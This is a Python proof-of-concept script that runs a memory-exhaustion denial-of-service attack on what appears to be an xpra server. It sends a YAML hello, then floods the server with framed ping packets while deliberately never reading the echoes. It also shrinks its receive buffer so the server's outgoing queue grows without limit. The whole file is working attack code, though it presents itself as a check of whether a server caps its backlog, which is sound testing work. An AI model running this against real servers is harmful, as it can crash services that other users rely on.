#!/usr/bin/env python3
# Usage: python3 ping-DoS-client.py HOST PORT [PINGS]  (server must support YAML)
#
# Floods the server with `ping` packets and never reads the replies.
#
# Each `ping` makes the server queue a `ping-echo` in its per-client send list
# (`ClientConnection.ordinary_packets`). Because this client never drains its
# socket, the server's write thread blocks on `send()` and that list is no longer
# emptied - yet the server's parse thread keeps reading our flood and appending
# more echoes. On an unpatched server the list grows without bound: watch the
# server process RSS climb until it is killed.
#
# A patched server should cap the outgoing backlog and disconnect this client
# instead: the flood then stops with a connection error (reported below).

import socket
import sys
import time
import yaml

BLOCK = 256  # number of pings per send() syscall


def frame(packet) -> bytes:
    payload = yaml.safe_dump(packet).encode()
    # xpra packet header: 'P', proto_flags (0x04 = YAML), level, index, 4-byte payload size
    return b"P\x04\0\0" + len(payload).to_bytes(4, "big") + payload


def main() -> None:
    host = sys.argv[1]
    port = int(sys.argv[2])
    # 0 (the default) floods until the server disconnects us or Ctrl-C:
    pings = int(sys.argv[3]) if len(sys.argv) > 3 else 0

    sock = socket.create_connection((host, port), timeout=10)
    # shrink our receive buffer so the server's send buffer fills quickly:
    # that is what makes the server's write thread block and its queue back up.
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2048)
    except OSError:
        pass
    # block on send (a healthy server reads our pings quickly); give up if it wedges:
    sock.settimeout(30)
    # advertise `ping` so the server assembles its ping handling for this connection:
    sock.sendall(frame(["hello", {"encoders": ["yaml"], "protocol-version": (7,), "ping": True}]))

    # deliberately never recv(): the server cannot drain its echoes to us.
    now = int(time.time() * 1000)
    ping_block = b"".join(frame(["ping", now, now, ""]) for _ in range(BLOCK))

    sent = 0
    start = time.monotonic()
    try:
        while pings == 0 or sent < pings:
            sock.sendall(ping_block)
            sent += BLOCK
            if sent % (BLOCK * 100) == 0:
                rate = sent / (time.monotonic() - start)
                print(f"sent {sent} pings ({rate:.0f}/s), reading no echoes", flush=True)
        print(f"sent all {sent} pings and the server kept the connection open")
        print("-> the server did NOT cap the backlog (vulnerable, or its cap is above this count)")
    except (BrokenPipeError, ConnectionResetError, socket.timeout, OSError) as e:
        elapsed = time.monotonic() - start
        print(f"connection dropped after {sent} pings in {elapsed:.1f}s: {e!r}")
        print("-> the server stopped the flood (good: a patched server caps the backlog)")
    except KeyboardInterrupt:
        print(f"\ninterrupted after sending {sent} pings")
    finally:
        sock.close()


if __name__ == "__main__":
    main()
